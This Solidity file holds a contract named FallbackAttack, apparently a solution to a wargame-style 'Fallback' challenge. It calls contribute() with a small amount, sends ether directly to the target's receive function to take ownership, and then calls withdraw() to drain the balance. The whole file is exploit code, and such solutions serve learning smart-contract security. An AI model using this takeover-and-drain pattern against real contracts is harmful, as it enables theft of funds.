// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external  payable;
    function withdraw() external ;
}

contract FallbackAttack {
    IFallback fb;

    event AttackOwner();

    error AttackOwnerError();

    receive() external payable { }

    constructor(address _fb) payable {
        fb = IFallback(_fb);
    }

    function attackOwner() public {
         bytes memory signature = abi.encodeWithSignature("contribute()");
        (bool success, bytes memory data) = address(fb).call{value: 0.0005 ether}(signature);
        if (success) {
            //
            (bool su, ) = address(fb).call{value: 0.0005 ether}("");
            if (su) emit AttackOwner();
            
        } else {
            // revert AttackOwnerError();
            revert(string(data));
        }
        
    }

    function attackWithdraw() public {
        fb.withdraw();
    }
    
}